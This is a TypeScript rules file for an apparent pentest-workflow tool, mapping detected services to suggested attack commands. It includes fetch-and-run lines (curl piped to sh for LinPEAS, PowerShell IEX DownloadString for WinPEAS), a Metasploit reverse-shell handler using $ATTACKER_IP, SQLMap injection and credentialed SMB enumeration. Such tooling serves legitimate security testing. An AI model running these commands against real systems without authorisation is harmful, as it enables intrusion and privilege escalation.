/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { SuggestionRule } from '@/components/phantom/types';

export const BUILT_IN_RULES: SuggestionRule[] = [
  {
    id: 'rule-http-ffuf',
    name: 'HTTP detected -> Web Directory Brute Force (FFUF)',
    condition: { service: 'http' },
    suggestNode: {
      title: 'FFUF - Directory Discovery',
      description: 'Fast web fuzzer written in Go for discovering directories, files and virtual hosts.',
      type: 'web',
      tool: 'FFUF',
      commandTemplate: 'ffuf -u http://$TARGET:$PORT/FUZZ -w $WORDLIST -ic -c',
      tags: ['web', 'bruteforce', 'directory-discovery']
    }
  },
  {
    id: 'rule-http-dirsearch',
    name: 'HTTP/S detected -> Web Directory Scan (Dirsearch)',
    condition: { service: 'http' },
    suggestNode: {
      title: 'Dirsearch - Web Scan',
      description: 'Advanced command-line tool designed to brute force directories and files in webservers.',
      type: 'web',
      tool: 'Dirsearch',
      commandTemplate: 'dirsearch -u http://$TARGET:$PORT/ -e php,txt,html,json -x 404,403',
      tags: ['web', 'scan', 'recon']
    }
  },
  {
    id: 'rule-http-nuclei',
    name: 'HTTP/S detected -> Vulnerability Scanner (Nuclei)',
    condition: { service: 'http' },
    suggestNode: {
      title: 'Nuclei - Vuln Scan',
      description: 'Fast and customizable vulnerability scanner based on simple YAML templates.',
      type: 'web',
      tool: 'Nuclei',
      commandTemplate: 'nuclei -u http://$TARGET:$PORT/ -t cves/ -severity critical,high',
      tags: ['web', 'vulnerability', 'automated']
    }
  },
  {
    id: 'rule-http-whatweb',
    name: 'HTTP/S detected -> Tech Stack Identifier (Whatweb)',
    condition: { service: 'http' },
    suggestNode: {
      title: 'WhatWeb - Technology Recon',
      description: 'Identifies website technologies including content management systems (CMS), blogging platforms, JavaScript libraries, and web servers.',
      type: 'web',
      tool: 'Whatweb',
      commandTemplate: 'whatweb -a 3 http://$TARGET:$PORT/',
      tags: ['web', 'recon', 'fingerprint']
    }
  },
  {
    id: 'rule-smb-crackmapexec',
    name: 'SMB detected -> Domain/Workgroup Recon (CrackMapExec)',
    condition: { service: 'smb' },
    suggestNode: {
      title: 'CrackMapExec SMB Enumeration',
      description: 'Swiss army knife for pentester auditing Active Directory networks.',
      type: 'ad',
      tool: 'CrackMapExec',
      commandTemplate: 'crackmapexec smb $TARGET -u "$USER" -p "$PASSWORD" --shares --interfaces',
      tags: ['smb', 'active-directory', 'recon']
    }
  },
  {
    id: 'rule-smb-enum4linux',
    name: 'SMB detected -> LDAP & SMB enum (enum4linux)',
    condition: { service: 'smb' },
    suggestNode: {
      title: 'enum4linux-ng SMB Recon',
      description: 'Next generation tool for enumerating information from Windows and Samba systems.',
      type: 'ad',
      tool: 'enum4linux',
      commandTemplate: 'enum4linux-ng -A $TARGET',
      tags: ['smb', 'windows', 'ldap', 'enum']
    }
  },
  {
    id: 'rule-smb-smbmap',
    name: 'SMB detected -> List Shares (SMBMap)',
    condition: { service: 'smb' },
    suggestNode: {
      title: 'SMBMap - Share Scanner',
      description: 'List share drives, drive permissions, share contents, upload/download capability, and filename matching.',
      type: 'ad',
      tool: 'SMBMap',
      commandTemplate: 'smbmap -H $TARGET -u "$USER" -p "$PASSWORD"',
      tags: ['smb', 'share', 'enumeration']
    }
  },
  {
    id: 'rule-dns-dnsenum',
    name: 'DNS detected -> DNS Subdomain Enumeration',
    condition: { service: 'dns' },
    suggestNode: {
      title: 'dnsenum - Zones & Subdomains',
      description: 'Multithreaded script to enumerate DNS information and discover subdomains.',
      type: 'discovery',
      tool: 'dnsenum',
      commandTemplate: 'dnsenum --dnsserver $TARGET --enum $DOMAIN',
      tags: ['dns', 'zones', 'subdomain']
    }
  },
  {
    id: 'rule-db-sqlmap',
    name: 'Database (MySQL/MSSQL) or Web Vulnerability -> SQL Injection (SQLMap)',
    condition: { service: 'mysql' },
    suggestNode: {
      title: 'SQLMap - Automated SQL Injection',
      description: 'Automatic SQL injection and database takeover tool.',
      type: 'exploitation',
      tool: 'SQLMap',
      commandTemplate: 'sqlmap -u "http://$TARGET:$PORT/page.php?id=1" --dbms=mysql --batch --banner --current-user',
      tags: ['database', 'injection', 'exploitation']
    }
  },
  {
    id: 'rule-exploit-metasploit',
    name: 'Exploitable service found -> Launch Metasploit Console',
    condition: { service: 'exploitable' },
    suggestNode: {
      title: 'Metasploit exploit launch',
      description: 'Launch exploit from Metasploit Framework command line interface.',
      type: 'exploitation',
      tool: 'Metasploit',
      commandTemplate: 'msfconsole -q -x "use exploit/multi/handler; set LHOST $ATTACKER_IP; set LPORT 4444; run"',
      tags: ['metasploit', 'exploitation', 'shell']
    }
  },
  {
    id: 'rule-post-linpeas',
    name: 'Linux Shell Authenticated -> Privilege Escalation Scan (LinPEAS)',
    condition: { service: 'shell-linux' },
    suggestNode: {
      title: 'LinPEAS - Privilege Escalation Linux',
      description: 'Searches for possible paths to escalate privileges on Linux hosts.',
      type: 'post-exploitation',
      tool: 'LinPEAS',
      commandTemplate: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh',
      tags: ['linux', 'peas', 'privesc', 'post-exploitation']
    }
  },
  {
    id: 'rule-post-winpeas',
    name: 'Windows Shell Authenticated -> Privilege Escalation Scan (WinPEAS)',
    condition: { service: 'shell-windows' },
    suggestNode: {
      title: 'WinPEAS - Privilege Escalation Windows',
      description: 'Searches for possible paths to escalate privileges on Windows hosts.',
      type: 'post-exploitation',
      tool: 'WinPEAS',
      commandTemplate: 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.ps1\')"',
      tags: ['windows', 'peas', 'privesc', 'post-exploitation']
    }
  }
];
